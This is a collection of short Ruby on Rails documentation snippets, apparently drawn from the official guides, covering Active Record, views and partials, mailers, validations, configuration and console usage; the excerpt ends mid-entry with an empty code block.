DESCRIPTION: Example of updating a product's name using the update method. This finds the record, changes the attribute, and saves it to the database in one operation.

LANGUAGE: irb
CODE:
store(dev)> product = Product.find(1)
store(dev)> product.update(name: "Shoes")
  TRANSACTION (0.1ms)  BEGIN immediate TRANSACTION /*application='Store'*/
  Product Update (0.3ms)  UPDATE "products" SET "name" = 'Shoes', "updated_at" = '2024-11-09 22:38:19.638912' WHERE "products"."id" = 1 /*application='Store'*/
  TRANSACTION (0.4ms)  COMMIT TRANSACTION /*application='Store'*/
=> true

----------------------------------------

TITLE: Adding Confirmation Dialogs to Buttons with Turbo
DESCRIPTION: ERB code showing how to add a confirmation dialog to a button_to helper in Rails using Turbo. This demonstrates adding the confirmation to the form data attributes.

LANGUAGE: erb
CODE:
<%= button_to "Delete post", post, method: :delete, form: { data: { turbo_confirm: "Are you sure?" } } %>

----------------------------------------

TITLE: Configuring Secure Token Generation on Create in Rails
DESCRIPTION: This example shows how to configure secure token generation to occur on record creation rather than initialization, and demonstrates the resulting behavior difference.

LANGUAGE: ruby
CODE:
# config/application.rb

config.active_record.generate_secure_token_on = :create

# app/models/user.rb
class User < ApplicationRecord
  has_secure_token on: :create
end

record = User.new
record.token # => nil
record.save!
record.token # => "fwZcXX6SkJBJRogzMdciS7wf"

----------------------------------------

TITLE: Creating a Table with Custom Primary Key
DESCRIPTION: Migration that creates a users table with a custom primary key named user_id instead of the default id column.

LANGUAGE: ruby
CODE:
class CreateUsers < ActiveRecord::Migration[8.1]
  def change
    create_table :users, primary_key: "user_id" do |t|
      t.string :username
      t.string :email
      t.timestamps
    end
  end
end

----------------------------------------

TITLE: Creating Nested Forms with fields_for in Rails
DESCRIPTION: Demonstrates how to build a nested form that allows creating a Person with multiple addresses. The fields_for helper renders form fields for each address association.

LANGUAGE: html+erb
CODE:
<%= form_with model: @person do |form| %>
  Addresses:
  <ul>
    <%= form.fields_for :addresses do |addresses_form| %>
      <li>
        <%= addresses_form.label :kind %>
        <%= addresses_form.text_field :kind %>

        <%= addresses_form.label :street %>
        <%= addresses_form.text_field :street %>
        ...
      </li>
    <% end %>
  </ul>
<% end %>

----------------------------------------

TITLE: Checking if a Collection is Empty in Rails Views
DESCRIPTION: Uses the collection.empty? method in an ERB template to check if an association contains any objects, displaying a message when the collection is empty.

LANGUAGE: html+erb
CODE:
<% if @part.assemblies.empty? %>
  This part is not used in any assemblies
<% end %>

----------------------------------------

TITLE: Configuring Action Mailer Default Options in Ruby
DESCRIPTION: Shows how to set default options for all mailers by configuring the default_options hash, in this case setting a default 'from' address.

LANGUAGE: ruby
CODE:
config.action_mailer.default_options = {
  from: "noreply@example.com"
}

----------------------------------------

TITLE: Including Images with ERB in Rails
DESCRIPTION: Shows how to include an image in a Rails view using the image_tag helper. Propshaft will automatically serve the correct digested version of the image in production.

LANGUAGE: erb
CODE:
<%= image_tag "rails.png" %>

----------------------------------------

TITLE: Instrumenting without Blocks in Ruby using ActiveSupport::Notifications
DESCRIPTION: Shows how to use the instrumentation infrastructure for messaging without passing a block. This allows sending notifications without measuring the execution time of a specific operation.

LANGUAGE: ruby
CODE:
ActiveSupport::Notifications.instrument "my.custom.event", this: :data

ActiveSupport::Notifications.subscribe "my.custom.event" do |name, started, finished, unique_id, data|
  puts data.inspect # {:this=>:data}
end

----------------------------------------

TITLE: Defining Initialization Event Hook in Rails Application Class
DESCRIPTION: This snippet demonstrates how to define an initialization event hook (before_initialize in this example) within a Rails::Application subclass. This approach is useful for running custom code at specific points during Rails' initialization process.

LANGUAGE: ruby
CODE:
module YourApp
  class Application < Rails::Application
    config.before_initialize do
      # initialization code goes here
    end
  end
end

----------------------------------------

TITLE: Using to_xml in Ruby on Rails Array extensions
DESCRIPTION: The to_xml method returns a string containing an XML representation of the array. It calls to_xml on each item and collects the results under a root node. Defined in active_support/core_ext/array/conversions.rb.

LANGUAGE: ruby
CODE:
Contributor.limit(2).order(:rank).to_xml
# =>
# <?xml version="1.0" encoding="UTF-8"?>
# <contributors type="array">
#   <contributor>
#     <id type="integer">4356</id>
#     <name>Jeremy Kemper</name>
#     <rank type="integer">1</rank>
#     <url-id>jeremy-kemper</url-id>
#   </contributor>
#   <contributor>
#     <id type="integer">4404</id>
#     <name>David Heinemeier Hansson</name>
#     <rank type="integer">2</rank>
#     <url-id>david-heinemeier-hansson</url-id>
#   </contributor>
# </contributors>

LANGUAGE: ruby
CODE:
[Contributor.first, Commit.first].to_xml
# =>
# <?xml version="1.0" encoding="UTF-8"?>
# <objects type="array">
#   <object>
#     <id type="integer">4583</id>
#     <name>Aaron Batalion</name>
#     <rank type="integer">53</rank>
#     <url-id>aaron-batalion</url-id>
#   </object>
#   <object>
#     <author>Joshua Peek</author>
#     <authored-timestamp type="datetime">2009-09-02T16:44:36Z</authored-timestamp>
#     <branch>origin/master</branch>
#     <committed-timestamp type="datetime">2009-09-02T16:44:36Z</committed-timestamp>
#     <committer>Joshua Peek</committer>
#     <git-show nil="true"></git-show>
#     <id type="integer">190316</id>
#     <imported-from-svn type="boolean">false</imported-from-svn>
#     <message>Kill AMo observing wrap_with_notifications since ARes was only using it</message>

----------------------------------------

TITLE: Suppressing Record Saving with ActiveRecord::Suppressor
DESCRIPTION: Shows how to use the ActiveRecord::Suppressor module to temporarily prevent specific record types from being saved. This example creates a User without creating the associated Notification record.

LANGUAGE: ruby
CODE:
Notification.suppress do
  User.create(name: "Jane", email: "jane@example.com")
end

----------------------------------------

TITLE: Configuring Custom Logger in Rails Application
DESCRIPTION: Shows how to configure alternative loggers in a Rails application by specifying them in the config/application.rb file.

LANGUAGE: ruby
CODE:
config.logger = Logger.new(STDOUT)
config.logger = Log4r::Logger.new("Application Log")

----------------------------------------

TITLE: Defining a Book Model with Composite Primary Key for Fixtures
DESCRIPTION: Shows how to define a Book model with a composite primary key for use with fixtures.

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  self.primary_key = [:author_id, :id]
  belongs_to :author
end

----------------------------------------

TITLE: Generated CSRF Meta Tags in HTML
DESCRIPTION: The HTML output generated by the csrf_meta_tags helper in Rails. These meta tags contain the CSRF token and parameter name that JavaScript can use to include proper authentication in AJAX requests.

LANGUAGE: html
CODE:
<head>
  <meta name="csrf-param" content="authenticity_token" />
  <meta name="csrf-token" content="THE-TOKEN" />
</head>

----------------------------------------

TITLE: Rendering Collections in Rails Partials
DESCRIPTION: Demonstrates how to render a collection of objects using partials, showing both the verbose each iteration approach and the concise collection rendering syntax.

LANGUAGE: erb
CODE:
<% @products.each do |product| %>
  <%= render partial: "product", locals: { product: product } %>
<% end %>

LANGUAGE: erb
CODE:
<%= render partial: "product", collection: @products %>

LANGUAGE: erb
CODE:
<%= render @products %>

----------------------------------------

TITLE: Viewing Available Rails Commands with --help
DESCRIPTION: Shows the output of running 'rails --help' which displays all available Rails commands. This includes common commands like generate, console, server, as well as specialized commands for assets, database operations, and more.

LANGUAGE: bash
CODE:
$ rails --help
Usage:
  bin/rails COMMAND [options]

You must specify a command. The most common commands are:

  generate     Generate new code (short-cut alias: "g")
  console      Start the Rails console (short-cut alias: "c")
  server       Start the Rails server (short-cut alias: "s")
  ...

All commands can be run with -h (or --help) for more information.

In addition to those commands, there are:
about                               List versions of all Rails ...
assets:clean[keep]                  Remove old compiled assets
assets:clobber                      Remove compiled assets
assets:environment                  Load asset compile environment
assets:precompile                   Compile all the assets ...
...
db:fixtures:load                    Load fixtures into the ...
db:migrate                          Migrate the database ...
db:migrate:status                   Display status of migrations
db:rollback                         Roll the schema back to ...
db:schema:cache:clear               Clears a db/schema_cache.yml file
db:schema:cache:dump                Create a db/schema_cache.yml file
db:schema:dump                      Create a database schema file (either db/schema.rb or db/structure.sql ...
db:schema:load                      Load a database schema file (either db/schema.rb or db/structure.sql ...
db:seed                             Load the seed data ...
db:version                          Retrieve the current schema ...
...
restart                             Restart app by touching ...
tmp:create                          Create tmp directories ...

----------------------------------------

TITLE: Defining Engine Routes
DESCRIPTION: This shows how routes are defined specifically for the engine rather than for the main application. Resources for articles are created within the engine's namespace.

LANGUAGE: ruby
CODE:
Blorgh::Engine.routes.draw do
  resources :articles
end

----------------------------------------

TITLE: Defining Cross-Database Associations with disable_joins in Ruby on Rails
DESCRIPTION: Shows how to define associations across different databases using the disable_joins option introduced in Rails 7.0. This prevents Rails from attempting to join across database clusters which isn't supported.

LANGUAGE: ruby
CODE:
class Dog < AnimalsRecord
  has_many :treats, through: :humans, disable_joins: true
  has_many :humans

  has_one :home
  has_one :yard, through: :home, disable_joins: true
end

class Home
  belongs_to :dog
  has_one :yard
end

class Yard
  belongs_to :home
end

----------------------------------------

TITLE: Mapping Database Protocol to Adapter in Rails
DESCRIPTION: This example demonstrates how to override the default database protocol-to-adapter mapping, configuring Rails to use the Trilogy adapter when a mysql:// URL protocol is specified.

LANGUAGE: ruby
CODE:
config.active_record.protocol_adapters.mysql = "trilogy"

----------------------------------------

TITLE: Rendering Raw File from Filesystem
DESCRIPTION: Rendering a file directly from the filesystem using the :file option. This can be useful for serving static error pages without processing them through ERB.

LANGUAGE: ruby
CODE:
render file: "#{Rails.root}/public/404.html", layout: false

----------------------------------------

TITLE: Halting Execution with throw :abort in ActiveRecord Callbacks
DESCRIPTION: Shows the recommended approach for halting callback chains using throw :abort. When used in before_validation, it causes create to return false instead of raising an exception.

LANGUAGE: ruby
CODE:
class Product < ActiveRecord::Base
  before_validation do
    throw :abort if total_price < 0
  end
end

Product.create # => false

----------------------------------------

TITLE: Demonstrating Cascading Callbacks in Rails Console
DESCRIPTION: Shows the execution of cascading callbacks in the Rails console. When the user is destroyed, the 'Article destroyed' message is logged, demonstrating the callback chain.

LANGUAGE: ruby
CODE:
irb> user = User.first
=> #<User id: 1>
irb> user.articles.create!
=> #<Article id: 1, user_id: 1>
irb> user.destroy
Article destroyed
=> #<User id: 1>

----------------------------------------

TITLE: Using to_key in ActiveModel::Conversion in IRB
DESCRIPTION: This IRB session demonstrates the to_key method from ActiveModel::Conversion. It returns an array containing the object's key attributes (typically the primary key) if the object is persisted.

LANGUAGE: ruby
CODE:
irb> person.to_key
=> [1]

----------------------------------------

TITLE: Creating reversible migrations with the change method
DESCRIPTION: Shows how to create reversible migrations using the new change method instead of defining separate up and down methods. Rails will automatically figure out how to reverse the migration.

LANGUAGE: ruby
CODE:
class MyMigration < ActiveRecord::Migration
  def change
    create_table(:horses) do |t|
      t.column :content, :text
      t.column :remind_at, :datetime
    end
  end
end

----------------------------------------

TITLE: Configuring Postfix to Pipe Emails to Action Mailbox
DESCRIPTION: Command to configure Postfix to forward incoming emails to Action Mailbox using the relay ingress. This command specifies the URL and authentication password.

LANGUAGE: bash
CODE:
$ bin/rails action_mailbox:ingress:postfix URL=https://example.com/rails/action_mailbox/relay/inbound_emails INGRESS_PASSWORD=...

----------------------------------------

TITLE: Conditionally Rendering Content Based on local_assigns in Rails Partials
DESCRIPTION: Shows how to use local_assigns to conditionally perform actions in a partial based on whether specific local variables are set, including hiding form fields and adjusting image sizes.

LANGUAGE: html+erb
CODE:
<% if local_assigns[:redirect] %>
  <%= form.hidden_field :redirect, value: true %>
<% end %>

LANGUAGE: html+erb
CODE:
<%= image_tag blob.representation(resize_to_limit: local_assigns[:in_gallery] ? [ 800, 600 ] : [ 1024, 768 ]) %>

----------------------------------------

TITLE: Using the 'helper' Object in Rails Console
DESCRIPTION: Shows how to access Rails and application helpers within the console environment. This allows testing helper methods directly from the console.

LANGUAGE: irb
CODE:
irb> helper.time_ago_in_words 30.days.ago
=> "about 1 month"

irb> helper.my_custom_helper
=> "my custom helper"

----------------------------------------

TITLE: Cache Decrement Example Payload in Active Support
DESCRIPTION: Example of the payload data available during a cache_decrement.active_support event. This shows the cache key, store class name, and decrement amount.

LANGUAGE: ruby
CODE:
{
  key: "bottles-of-beer",
  store: "ActiveSupport::Cache::RedisCacheStore",
  amount: 1
}

----------------------------------------

TITLE: Demonstrating where.not Query Generation Change in Rails 6.1
DESCRIPTION: Shows how where.not now generates NAND predicates instead of NOR in Rails 6.1.

LANGUAGE: ruby
CODE:
User.where.not(name: "Jon", role: "admin")
# SELECT * FROM users WHERE name != 'Jon' AND role != 'admin'

LANGUAGE: ruby
CODE:
User.where.not(name: "Jon", role: "admin")
# SELECT * FROM users WHERE NOT (name = 'Jon' AND role = 'admin')

----------------------------------------

TITLE: Rendering Templates from Different Controllers
DESCRIPTION: Example of rendering a template from a different controller by specifying the relative path to the template from the app/views directory.

LANGUAGE: ruby
CODE:
render "products/show"

----------------------------------------

TITLE: Using Date Ranges in ActiveRecord Conditions
DESCRIPTION: Demonstrates how to query for records within a specific date range using Ruby ranges, which gets translated to SQL BETWEEN conditions.

LANGUAGE: ruby
CODE:
Book.where(created_at: (Time.now.midnight - 1.day)..Time.now.midnight)

----------------------------------------

TITLE: Setting Cookie Expiration in Rails
DESCRIPTION: Example of setting a cookie with a specific expiration time. This code creates a cookie that will expire after 1 hour.

LANGUAGE: ruby
CODE:
cookies[:login] = { value: "XJ-122", expires: 1.hour }

----------------------------------------

TITLE: Checking Errors for Specific Attributes with errors[]
DESCRIPTION: This example demonstrates how to check validation errors for specific attributes using the errors[] method. It shows retrieving error messages for the name attribute in different validation scenarios.

LANGUAGE: ruby
CODE:
irb> person = Person.new(name: "John Doe")
irb> person.valid?
=> true
irb> person.errors[:name]
=> []

irb> person = Person.new(name: "JD")
irb> person.valid?
=> false
irb> person.errors[:name]
=> ["is too short (minimum is 3 characters)"]

irb> person = Person.new
irb> person.valid?
=> false
irb> person.errors[:name]
=> ["can't be blank", "is too short (minimum is 3 characters)"]

----------------------------------------

TITLE: Ordering Records in Rails Query
DESCRIPTION: Using the order method to sort products by name in ascending order. This adds an ORDER BY clause to the SQL query.

LANGUAGE: irb
CODE:
store(dev)> Product.order(name: :asc)
  Product Load (0.3ms)  SELECT "products".* FROM "products" /* loading for pp */ ORDER BY "products"."name" ASC LIMIT 11 /*application='Store'*/
=> [#<Product:0x0000000120e02a88 id: 2, name: "Pants", created_at: "2024-11-09 16:36:01.856751000 +0000", updated_at: "2024-11-09 16:36:01.856751000 +0000">,
 #<Product:0x0000000120e02948 id: 1, name: "T-Shirt", created_at: "2024-11-09 16:35:01.117836000 +0000", updated_at: "2024-11-09 16:35:01.117836000 +0000">]

----------------------------------------

TITLE: NGINX Configuration for Far-future Expires Headers
DESCRIPTION: NGINX server configuration to add far-future expires headers to precompiled assets. This ensures browsers cache the assets for a full year and only download new versions when the digest changes.

LANGUAGE: nginx
CODE:
location ~ ^/assets/ {
  expires 1y;
  add_header Cache-Control public;

  add_header ETag "";
}

----------------------------------------

TITLE: Rejecting Empty Records in Nested Attributes
DESCRIPTION: Demonstrates how to configure accepts_nested_attributes_for to ignore empty or incomplete sets of attributes using the reject_if option, preventing the creation of empty associated records.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  has_many :addresses
  accepts_nested_attributes_for :addresses, reject_if: lambda { |attributes| attributes["kind"].blank? }
end

----------------------------------------

TITLE: Implementing full_message Method in Active Model
DESCRIPTION: Example showing how Rails uses humanize as a fallback when generating error messages for model attributes.

LANGUAGE: ruby
CODE:
def full_messages
  map { |attribute, message| full_message(attribute, message) }
end

def full_message
  # ...
  attr_name = attribute.to_s.tr(".", "_").humanize
  attr_name = @base.class.human_attribute_name(attribute, default: attr_name)
  # ...
end

----------------------------------------

TITLE: Configuring Email Routing in Action Mailbox
DESCRIPTION: Example of setting up routing in Action Mailbox to direct incoming emails to specific mailboxes based on email address patterns. Routes emails to 'forwards' and 'replies' mailboxes.

LANGUAGE: ruby
CODE:
# app/mailboxes/application_mailbox.rb
class ApplicationMailbox < ActionMailbox::Base
  routing(/^save@/i     => :forwards)
  routing(/@replies\./i => :replies)
end

----------------------------------------

TITLE: Creating a has_one Association with Unique Index and Foreign Key
DESCRIPTION: This snippet shows how to create a table with a belongs_to association that includes a unique index and foreign key constraint. This enforces the one-to-one relationship at the database level.

LANGUAGE: ruby
CODE:
create_table :accounts do |t|
  t.belongs_to :supplier, index: { unique: true }, foreign_key: true
  # ...
end

----------------------------------------

TITLE: Using module_parents to Get Module Ancestry Chain in Ruby
DESCRIPTION: Shows how module_parents method returns an array of parent modules from bottom to top until Object is reached, providing the complete module ancestry chain.

LANGUAGE: ruby
CODE:
module X
  module Y
    module Z
    end
  end
end
M = X::Y::Z

X::Y::Z.module_parents # => [X::Y, X, Object]
M.module_parents       # => [X::Y, X, Object]

----------------------------------------

TITLE: Specifying Custom Path for ActiveStorage Command in Rails
DESCRIPTION: Sets a custom path for external tools used by ActiveStorage. This example specifies the location of the ffprobe executable.

LANGUAGE: ruby
CODE:
config.active_storage.paths[:ffprobe] = "/usr/local/bin/ffprobe"

----------------------------------------

TITLE: Adding CSRF Token to HTML Head for AJAX Requests
DESCRIPTION: This HTML snippet demonstrates how to add the CSRF token to the page's meta tags, which is useful for AJAX calls. The form_authenticity_token helper generates the token that custom JavaScript can use for API requests.

LANGUAGE: html
CODE:
<!-- app/views/layouts/application.html.erb -->
<head>
  <meta name="csrf-token" content="<%= form_authenticity_token %>">
</head>

----------------------------------------

TITLE: Displaying Model Generator Help
DESCRIPTION: Shows usage information for the model generator, including how to specify model attributes with types and indexes. This helps developers understand the available options when creating models.

LANGUAGE: bash
CODE:
$ bin/rails generate model
Usage:
  bin/rails generate model NAME [field[:type][:index] field[:type][:index]] [options]

...

ActiveRecord options:
      [--migration], [--no-migration]        # Indicates when to generate migration
                                             # Default: true

...

Description:
    Generates a new model. Pass the model name, either CamelCased or
    under_scored, and an optional list of attribute pairs as arguments.

...

----------------------------------------

TITLE: Configuring ActionMailer with sendmail delivery method
DESCRIPTION: Example configuration for ActionMailer using the sendmail delivery method. Shows how to set up delivery options, error handling, and default email settings in a Rails environment configuration file.

LANGUAGE: ruby
CODE:
config.action_mailer.delivery_method = :sendmail
# Defaults to:
# config.action_mailer.sendmail_settings = {
#   location: '/usr/sbin/sendmail',
#   arguments: %w[ -i ]
# }
config.action_mailer.perform_deliveries = true
config.action_mailer.raise_delivery_errors = true
config.action_mailer.default_options = { from: "no-reply@example.com" }

----------------------------------------

TITLE: Basic Rails Template Example
DESCRIPTION: A typical Rails template example showing how to generate a scaffold, add a root route, run migrations, and initialize a Git repository after bundle installation.

LANGUAGE: ruby
CODE:
# template.rb
generate(:scaffold, "person name:string")
route "root to: 'people#index'"
rails_command("db:migrate")

after_bundle do
  git :init
  git add: "."
  git commit: %Q{ -m 'Initial commit' }
end

----------------------------------------

TITLE: Setting Queue Adapter for a Specific Job Class
DESCRIPTION: Shows how to override the default queue adapter for a specific job class by setting the queue_adapter property. This job will use Resque instead of the application default.

LANGUAGE: ruby
CODE:
class GuestsCleanupJob < ApplicationJob
  self.queue_adapter = :resque
  # ...
end

# Now your job will use `resque` as its backend queue adapter, overriding the default Solid Queue adapter.

----------------------------------------

TITLE: Using the 'app' Object in Rails Console
DESCRIPTION: Shows how to use the 'app' object in the Rails console to access route helpers and make HTTP requests. This allows for testing routes and controllers directly from the console.

LANGUAGE: irb
CODE:
irb> app.root_path
=> "/"

irb> app.get _
Started GET "/" for 127.0.0.1 at 2014-06-19 10:41:57 -0300
...

----------------------------------------

TITLE: Configuring EnvelopeEncryptionKeyProvider for Active Record
DESCRIPTION: Sets up envelope encryption which generates a random key for each encryption operation and stores the encrypted data-key with the data itself. This is a more advanced key management strategy.

LANGUAGE: ruby
CODE:
config.active_record.encryption.key_provider = ActiveRecord::Encryption::EnvelopeEncryptionKeyProvider.new

----------------------------------------

TITLE: Testing Action Cable Channel Subscriptions in Rails
DESCRIPTION: A test example for Action Cable channels using ActionCable::Channel::TestCase. This test verifies that a subscription to a chat channel is confirmed and the correct stream is established.

LANGUAGE: ruby
CODE:
require "test_helper"

class ChatChannelTest < ActionCable::Channel::TestCase
  test "subscribes and stream for room" do
    # Simulate a subscription creation by calling `subscribe`
    subscribe room: "15"

    # You can access the Channel object via `subscription` in tests
    assert subscription.confirmed?
    assert_has_stream "chat_15"
  end
end

----------------------------------------

TITLE: Testing Custom Exception in Strict Validations
DESCRIPTION: Shows how a custom exception is raised when strict validations fail. The exception type matches the one specified in the validation definition.

LANGUAGE: ruby
CODE:
irb> Person.new.valid?
=> TokenGenerationException: Token can't be blank

----------------------------------------

TITLE: Formatting Numbers with Delimiters in Ruby on Rails
DESCRIPTION: The to_fs(:delimited) method formats numbers with delimiters for thousands separators and decimal points, with customizable delimiter and separator characters.

LANGUAGE: ruby
CODE:
12345678.to_fs(:delimited)                     # => 12,345,678
12345678.05.to_fs(:delimited)                  # => 12,345,678.05
12345678.to_fs(:delimited, delimiter: ".")     # => 12.345.678
12345678.to_fs(:delimited, delimiter: ",")     # => 12,345,678
12345678.05.to_fs(:delimited, separator: " ")  # => 12,345,678 05

----------------------------------------

TITLE: Dynamic Exclusion Validation Using Proc in Rails
DESCRIPTION: Shows how to implement dynamic exclusion validation using a proc that returns an enumerable set of reserved values. This allows the excluded values to be determined at runtime.

LANGUAGE: ruby
CODE:
class Account < ApplicationRecord
  validates :subdomain, exclusion: { in: ->(account) { account.reserved_subdomains } }

  def reserved_subdomains
    %w(www us ca jp admin)
  end
end

----------------------------------------

TITLE: Using image_tag with Custom Asset Host
DESCRIPTION: Example showing how image_tag behaves when a custom asset_host is configured, generating an image tag with the correct URL incorporating the asset host.

LANGUAGE: ruby
CODE:
image_tag("rails.png")
# => <img src="//assets.example.com/images/rails.png" />

----------------------------------------

TITLE: Using JSON Serialization Methods in Ruby IRB Console
DESCRIPTION: This example shows how to use as_json and to_json methods provided by ActiveModel::Serializers::JSON module. It demonstrates creating a Person object, setting attributes, and converting it to different formats.

LANGUAGE: ruby
CODE:
irb> person = Person.new

# A hash representing the model with its keys as a string
irb> person.as_json
=> {"name" => nil}

# A JSON string representing the model
irb> person.to_json
=> "{\"name\":null}"

irb> person.name = "Bob"
irb> person.as_json
=> {"name" => "Bob"}

irb> person.to_json
=> "{\"name\":\"Bob\"}"

----------------------------------------

TITLE: Using Form Partial in New Product View in Rails ERB
DESCRIPTION: Updates the new product view to use the shared form partial, passing the @product instance variable as a local variable to the partial.

LANGUAGE: erb
CODE:
<h1>New product</h1>

<%= render "form", product: @product %>
<%= link_to "Cancel", products_path %>

----------------------------------------

TITLE: Using Nokogiri for HTML Response Parsing in Rails Tests
DESCRIPTION: Example showing how to use the extended response.parsed_body functionality to parse HTML responses into Nokogiri documents for testing. This enables DOM-based assertions on HTML content.

LANGUAGE: ruby
CODE:
get "/posts"

response.content_type         # => "text/html; charset=utf-8"
response.parsed_body.class    # => Nokogiri::HTML5::Document
response.parsed_body.to_html  # => "<!DOCTYPE html>\n<html>\n..."

----------------------------------------

TITLE: Using Partials to Simplify Rails Views
DESCRIPTION: Shows how to use partials to organize and simplify complex views by extracting reusable components like headers, footers, and ad banners.

LANGUAGE: erb
CODE:
<%= render "application/ad_banner" %>

<h1>Products</h1>

<p>Here are a few of our fine products:</p>
<%# ... %>

<%= render "application/footer" %>

----------------------------------------

TITLE: Output of Validation Error when Creating an Associated Object in Ruby on Rails
DESCRIPTION: Example of the error message displayed when attempting to create an invalid associated object. The error shows that validation failed because the name cannot be blank.

LANGUAGE: irb
CODE:
irb> raise_validation_error: Validation failed: Name can't be blank (ActiveRecord::RecordInvalid)

----------------------------------------

TITLE: Disabling Mailer Previews in Ruby
DESCRIPTION: Demonstrates how to disable the mailer preview functionality which is enabled by default in the development environment.

LANGUAGE: ruby
CODE:
config.action_mailer.show_previews = false

----------------------------------------

TITLE: Rendering with Symbol and HTTP Status
DESCRIPTION: An alternative implementation of the update action that uses a symbol to specify the template and explicitly sets the HTTP status code for the response.

LANGUAGE: ruby
CODE:
def update
  @book = Book.find(params[:id])
  if @book.update(book_params)
    redirect_to(@book)
  else
    render :edit, status: :unprocessable_entity
  end
end

----------------------------------------

TITLE: Safely Handling LIKE Conditions in ActiveRecord
DESCRIPTION: Shows how to properly escape wildcard characters in LIKE queries to prevent unexpected behavior and potential security issues when using user input.

LANGUAGE: ruby
CODE:
Book.where("title LIKE ?",
  Book.sanitize_sql_like(params[:title]) + "%")

----------------------------------------

TITLE: Conditional Fragment Caching in Rails Views
DESCRIPTION: This code shows how to conditionally cache fragments in Rails views using cache_if. The example only caches the product rendering when the user is an admin.

LANGUAGE: html+erb
CODE:
<% cache_if admin?, product do %>
  <%= render product %>
<% end %>

----------------------------------------

TITLE: Validating Hash Keys with assert_valid_keys in Rails
DESCRIPTION: The assert_valid_keys method checks if a hash contains any keys not specified in the arguments list, raising an ArgumentError if it does. Useful for validating options in method parameters.

LANGUAGE: ruby
CODE:
{ a: 1 }.assert_valid_keys(:a)  # passes
{ a: 1 }.assert_valid_keys("a") # ArgumentError

----------------------------------------

TITLE: Installing Ruby Development Environment on Ubuntu
DESCRIPTION: This snippet demonstrates how to set up a Ruby development environment on Ubuntu by installing required dependencies with apt and using the Mise version manager to install Ruby 3.

LANGUAGE: bash
CODE:
# Install dependencies with apt
$ sudo apt update
$ sudo apt install build-essential rustc libssl-dev libyaml-dev zlib1g-dev libgmp-dev

# Install Mise version manager
$ curl https://mise.run | sh
$ echo 'eval "$(~/.local/bin/mise activate)"' >> ~/.bashrc
$ source ~/.bashrc

# Install Ruby globally with Mise
$ mise use -g ruby@3

----------------------------------------

TITLE: Taking a single customer record in Ruby using Active Record
DESCRIPTION: Example of using the take method to retrieve a single customer record without any specific ordering.

LANGUAGE: ruby
CODE:
irb> customer = Customer.take
=> #<Customer id: 1, first_name: "Lifo">

----------------------------------------

TITLE: Standalone Action Cable Server Configuration
DESCRIPTION: Ruby configuration for setting up a standalone Action Cable server using Rack. This allows the WebSocket server to run separately from the main Rails application server.

LANGUAGE: ruby
CODE:
# cable/config.ru
require_relative "../config/environment"
Rails.application.eager_load!

run ActionCable.server

----------------------------------------

TITLE: Disabling Compression for Encrypted Attributes
DESCRIPTION: Turns off compression for a specific encrypted attribute. By default, Active Record compresses encrypted payloads to save storage space, but this can be disabled per attribute.

LANGUAGE: ruby
CODE:
class Article < ApplicationRecord
  encrypts :content, compress: false
end

----------------------------------------

TITLE: SQL Generated by Where and Order in Rails
DESCRIPTION: Shows the SQL generated by the where and order methods, demonstrating how Active Record translates these methods into SQL WHERE and ORDER BY clauses.

LANGUAGE: sql
CODE:
SELECT "books".* FROM "books" WHERE "books"."author" = ? ORDER BY "books"."created_at" DESC [["author", "Douglas Adams"]]

----------------------------------------

TITLE: Reloading has_one Associations in Rails
DESCRIPTION: This snippet demonstrates how to force a database read by reloading the association, ignoring any cached versions. This is useful when you need to ensure you have the most up-to-date associated record.

LANGUAGE: ruby
CODE:
@account = @supplier.reload_account

----------------------------------------

TITLE: Counting Objects in an Association Collection
DESCRIPTION: Uses the collection.size method to determine the number of objects in an association, storing the count in a variable.

LANGUAGE: ruby
CODE:
@assembly_count = @part.assemblies.size

----------------------------------------

TITLE: Grouping Array Elements with in_groups_of in Rails
DESCRIPTION: Demonstrates the in_groups_of method which splits an array into consecutive groups of a specified size. It shows how to control padding for incomplete groups using nil, custom values, or no padding at all.

LANGUAGE: ruby
CODE:
[1, 2, 3].in_groups_of(2) # => [[1, 2], [3, nil]]

LANGUAGE: html+erb
CODE:
<% sample.in_groups_of(3) do |a, b, c| %>
  <tr>
    <td><%= a %></td>
    <td><%= b %></td>
    <td><%= c %></td>
  </tr>
<% end %>

LANGUAGE: ruby
CODE:
[1, 2, 3].in_groups_of(2, 0) # => [[1, 2], [3, 0]]

LANGUAGE: ruby
CODE:
[1, 2, 3].in_groups_of(2, false) # => [[1, 2], [3]]

----------------------------------------

TITLE: Creating Engine Configuration Initializer
DESCRIPTION: Sets up an initializer in the host application to configure the engine's author_class setting, specifying which class represents users.

LANGUAGE: ruby
CODE:
Blorgh.author_class = "User"

----------------------------------------

TITLE: Deleting an Author and Their Books Using Associations in Ruby on Rails
DESCRIPTION: Code example demonstrating how to delete an author and all their books using associations. With the dependent: :destroy option, deleting the author automatically deletes all associated books.

LANGUAGE: ruby
CODE:
@author.destroy

----------------------------------------

TITLE: Default Scope Behavior Before Rails 4.1
DESCRIPTION: Example of how default_scope worked in Rails before version 4.1, where chained conditions would override the default scope for the same field.

LANGUAGE: ruby
CODE:
class User < ActiveRecord::Base
  default_scope { where state: "pending" }
  scope :active, -> { where state: "active" }
  scope :inactive, -> { where state: "inactive" }
end

User.all
# SELECT "users".* FROM "users" WHERE "users"."state" = 'pending'

User.active
# SELECT "users".* FROM "users" WHERE "users"."state" = 'active'

User.where(state: "inactive")
# SELECT "users".* FROM "users" WHERE "users"."state" = 'inactive'

----------------------------------------

TITLE: Viewing Rails Plugin Generator Help
DESCRIPTION: Command to display usage information and available options for the Rails plugin generator. This helps developers understand all possible configuration options when creating a new plugin.

LANGUAGE: bash
CODE:
$ rails plugin new --help

----------------------------------------

TITLE: Configuring Rails Session Cookie Settings
DESCRIPTION: Shows how to configure session cookie settings including the cookie name (key). This changes how the session cookie is identified in the browser.

LANGUAGE: ruby
CODE:
Rails.application.config.session_store :cookie_store, key: "_your_app_session"

----------------------------------------

TITLE: Extracting Locale from Subdomain in Rails
DESCRIPTION: A method to extract the locale from the subdomain part of a URL, validating against available locales in the application. This enables locale-specific subdomains like fr.application.com.

LANGUAGE: ruby
CODE:
def extract_locale_from_subdomain
  parsed_locale = request.subdomains.first
  I18n.available_locales.map(&:to_s).include?(parsed_locale) ? parsed_locale : nil
end

----------------------------------------

TITLE: Splitting Arrays Based on Separators in Rails
DESCRIPTION: Demonstrates the split method which divides an array by separators and returns the resulting chunks. It can work with block-based conditions or specific separator values.

LANGUAGE: ruby
CODE:
(-5..5).to_a.split { |i| i.multiple_of?(4) }
# => [[-5], [-3, -2, -1], [1, 2, 3], [5]]

LANGUAGE: ruby
CODE:
